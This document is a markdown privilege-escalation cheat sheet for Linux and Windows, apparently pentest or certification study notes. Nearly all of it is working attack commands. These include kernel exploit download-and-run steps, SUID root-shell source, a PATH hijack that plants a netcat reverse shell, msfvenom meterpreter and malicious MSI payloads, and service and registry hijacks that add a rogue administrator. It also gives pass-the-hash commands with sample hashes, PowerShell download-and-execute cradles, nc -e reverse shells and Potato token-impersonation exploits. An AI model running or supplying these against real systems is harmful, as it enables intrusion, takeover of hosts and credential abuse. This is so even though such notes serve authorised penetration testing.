# Linux

## Enumeration

* Linux Enumeration: [LinEnum.sh](https://github.com/rebootuser/LinEnum)
* Linux Exploits: [linuxprivcheck.py](http://www.securitysift.com/download/linuxprivchecker.py)
* Linux Kernel Exploits: [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)
* Linux Kernel Exploits: [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

## Kernel

:warning: Compile options to fix errors: `-Wl`, `--hash-style=both`, `-m32`

* CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
https://dirtycow.ninja/
First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016

* CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
https://www.exploit-db.com/exploits/14814/

```
 wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
 $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
 $ ./i-can-haz-modharden
 [+] launching root shell!
 # id
 uid=0(root) gid=0(root)
```

* CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
https://www.exploit-db.com/exploits/15285/

* CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
https://git.zx2c4.com/CVE-2012-0056/about/
Linux CVE 2012-0056

```
  wget -O exploit.c http://www.exploit-db.com/download/18411 
  gcc -o mempodipper exploit.c  
  ./mempodipper
```

## Softwares

### Privileged Services

```
ps -auxwwf | grep root
```

### Exim < 4.86.2

* https://github.com/HackerFantastic/Public/blob/master/exploits/cve-2016-1531.sh

### Check vulnerable software

```
# Debian 
dpkg -l 
 
# CentOS, OpenSuse, Fedora, RHEL 
rpm -qa (CentOS / openSUSE ) 
 
# OpenBSD, FreeBSD 
pkg_info
```

## Sudo

* `sudo su -`
* `sudo -l`

## NFS

**On victim host**
* `cat /etc/exports`: if `no_root_squash` option **is defined** for the `/tmp` export (or another export)

**On attacker host (as root)**
* `showmount -e <IP_VICTIM>`
* Mount the share: `mount -o rw,vers=2 <IP_VICTIM>:/tmp /tmp/`
* `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/x.c`
* `gcc /tmp/x.c -o /tmp/x`
* `chmod +s /tmp/x`

**On victim host again**
* Execute `/tmp/x`

## Cron

* Detect sheduled tasks with `pspy`: https://github.com/DominicBreuker/pspy

## File permissions

### Change PATH

```
 set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
 chmod +x ssh
```

### SUID file

* Create SUID C binary files
```  
  int main(void){  
  setresuid(0, 0, 0); // setreuid(0, 0); // setuid(0); // setgid(0); setuid(0);
  system("/bin/sh");  
  }  

  # Building the SUID Shell binary  
  gcc -o suid suid.c  
  For 32 bit:  
  gcc -m32 -o suid suid.c
```

* Create and compile an SUID from a limited shell (no file transfer)
```
 echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
 gcc privsc.c -o privsc
```

### World writable directories

```
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```

# Windows

**Good ressources if you run out of ideas**

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
* https://guif.re/windowseop
* https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

**Tips**

* :warning: Check Arch of your payloads! (e.g `PS > [Environment]::Is64BitProcess`). It might be the source of your problems.

## Enumeration

* Windows Kernel Exploit: [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
* Windows Exploits: [Sherlock](https://github.com/rasta-mouse/Sherlock)
* Windows Enumeration: [Jaws](https://github.com/411Hall/JAWS)
* Windows Enumeration: [PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)
```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```
* Windows Enumeration: [JollyKatz](https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md)

## Kernel

* `systeminfo`

Pre-compiled exploits: 
* https://github.com/SecWiki/windows-kernel-exploits
* https://github.com/AusJock/Privilege-Escalation/tree/master/Windows
* https://github.com/abatchy17/WindowsExploits

List the updates that are installed on the machine:
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**Compile Python exploit** into an executable:
```
python pyinstaller.py --onefile exploit.py
```

**Compile windows executable** on linux:
```
i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
```

## Services

### Any services running as SYSTEM?
* `tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"`

### Insecure File/Folder Permissions

Unquoted Service Paths takes advantage of folder permissions along the executable file path of a service. But here we will try to replace the executable directly.

We have to check permissions for our Vulnerable Service’s executable path:
```
icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
```

Simply replacing service executable file with a reverse shell payload and restarting the service.

### Task Scheduler

This method only works on a Windows 2000, XP, or 2003 machine. You must have local administrator privileges to manage scheduled tasks.

* Start `Task Scheduler`: `net start "Task Scheduler"`
* Get current time: `time`
* Create a task that will run our executable about 1 minute after the current time:
```
at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
```

### DLL Hijacking

When a process attempts to load a DLL, the system searches directories in the following order:
* The directory from which the application loaded.
* The system directory.
* The 16-bit system directory.
* The Windows directory.
* The current directory.
* The directories that are listed in the PATH environment variable.

Steps in order to hijack a DLL:
* Find processes running with higher privileges than ours.
* Download an analyze binaries of these processes.
* By reverse engineering a binary, locate DLLs names loaded **OR** use [Procmon](https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx) **OR** use enumeration scripts.
* If it does not exist, place the malicious copy of DLL to one of the directories that I mentioned above. When process executed, it will find and load malicious DLL.
* If the DLL file already exists in any of these paths, try to place malicious DLL to a directory with a higher priority than the directory where the original DLL file exists.


### AlwaysInstallElevated

`AlwaysInstallElevated` is a policy setting that directs Windows Installer to use elevated permissions when it installs any package on the system. If this policy setting is enabled, privileges are extended to all programs.

* Check is `AlwaysInstallElevated` is enabled:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If you see the following output, it means the policy setting is enabled and you can exploit it.

Windows Installer will use elevated permissions when it installs any package. So we should generate a malicious .msi package and run it.

* Create payloads:
```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" > malicious.msi
```
* Install package and trigger payload:
```
msiexec /quiet /qn /i malicious.msi

/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

### Unquoted path

* List all unquoted service paths
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

* Check folder permissions on results. Look for M (modify) or W (write) for current user
```
icacls "C:\Program Files (x86)\Privacyware"
```

### Insecure Service Permissions

To check which Services have vulnerable privileges we can use [AccessChk](https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx) tool from [SysInternals Suite](https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx).

Accesscheck will determine which service bin paths can be modified.

* Execute `accesschk` avalaible [here](https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx)
* List potentially vulnerable services: `accesschk.exe -uwcqv *`
* You can also supply a group name or a username: 
```
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "testuser" * # All services that "testuser" can modify will be listed
```

This will show list each service and the groups which have write permissions to that service – if you have an account in any of these groups then you’ve potentially got privilege escalation.

Then we can use sc qc to determine the properties, you want to look for the following listed below.

Look for: **SERVICE_CHANGE_CONFIG**, **SERVICE_ALL_ACCESS**, **GENERIC_WRITE**, **GENERIC_ALL**, **WRITE_DAC**, **WRITE_OWNER **

**SERVICE_ALL_ACCESS** means we have full control over modifying the properties of Vulnerable Service.

* Let’s view the properties of the Vulnerable Service:
```
sc qc "Vulnerable Service Name"
```

`BINARY_PATH_NAME` points to executable file for this service. If we change this value with any command means this command will run as SYSTEM at the next start of the service.

* Exploit: add a new local administrator:
```
sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add"
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"
sc start "Vulnerable Service"
```

### Insecure Registry Permissions

* Upload [SubInACL](https://www.microsoft.com/en-us/download/details.aspx?id=23510) tool to check registry keys permissions.
* Check permissions for services running as `SYSTEM`:
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service Name" /display
```

If `Everyone` has Full Control on this registry key, it means we can change the executable path of this service by editing the `ImagePath` value.

If we generate a simple reverse shell payload and drop it to our target, all that remains is changing the ImagePath value for our vulnerable service with our payload’s path.

* Let’s change the `ImagePath` value with our payload’s path:
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service Name" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
```

* At the next start of the service, Payload.exe will run as SYSTEM. We had to restart the computer to do this:
```
shutdown /r /t 0
```

## PassTheHash

* Use Windows Credentials Editor (WCE)

* Set the SMBHASH environment variable and run `pth-winexe`
```
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator //10.11.01.76 cmd 

OR

pth-winexe --user=username/administrator%hash:hash --system //10.10.10.63 cmd.exe


```

* Remote Desktop: `xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101`

## RunAs

### PowerShell

* Oneliners:
```
# Requires PSRemoting
$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }

# without PSRemoting
cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))

# without PS Remoting, with arguments
cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"
```

* Script runas.ps1:
```
$username = 'user'
$password = 'password'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process nc.exe -ArgumentList '-e cmd.exe 10.10.10.10 4444' -Credential $credential

powershell -ExecutionPolicy Bypass -File runas.ps1
```

### CMD

```
# Requires interactive console
runas /user:userName cmd.exe
```

### PsExec

```
psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
/opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82
```

### Pth-WinExe

```
pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
```

### RunAs.exe

```
C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
 Enter the password for Test:
 Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
```

#### Powershell

```
net use x: \\localhost\c$ /user:administrator PASSWORD
```

## Abusing Token Privileges

### Windows Server 2003 and IIS 6.0

https://www.exploit-db.com/exploits/6705/

https://github.com/Re4son/Churrasco

```
 c:\Inetpub>churrasco
 churrasco
 /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

 c:\Inetpub>churrasco -d "net user /add <username> <password>"
 c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
 c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
```

### Rotten Potato

```
whoami /priv
```

If we have `SeImpersonatePrivilege`, `SeImpersonate` or `SeAssignPrimaryToken` privileges, we can make a token impersonation.

* Execute the binary: [RottenPotato](https://github.com/breenmachine/RottenPotatoNG)
* Or execute Powershell commands:
```
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

If it doesn't work:
* https://github.com/decoder-it/lonelypotato
* `rev.bat` (simple powershell command to get a shell):
```
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')
```
* Run
```
c:\temp\MSFRottenPotato.exe * \temp\rev.bat
```
* And we catch a callback for a SYSTEM shell

### Juicy Potato

Binary available at: https://github.com/ohpe/juicy-potato/releases    
:warning: Juicy Potato doesn't work in Windows Server 2019. 

1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)

    ```powershell
    whoami /priv
    ```

2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object

    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
    * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 

3. Execute JuicyPotato to run a privileged command.

    ```powershell
    JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
    JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
    JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
        Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
        ......
        [+] authresult 0
        {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
        [+] CreateProcessWithTokenW OK
    ```

# References

* https://ired.team/offensive-security-experiments/offensive-security-cheetsheets#post-exploitation-and-maintaining-access
* https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#file-transfers
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* https://www.gracefulsecurity.com/privesc-insecure-service-permissions/
* https://paper.dropbox.com/doc/OSCP-Methodology-EnVX7VSiNGZ2K2QxCZD7Q
* https://labs.f-secure.com/assets/BlogFiles/mwri-windows-services-all-roads-lead-to-system-whitepaper.pdf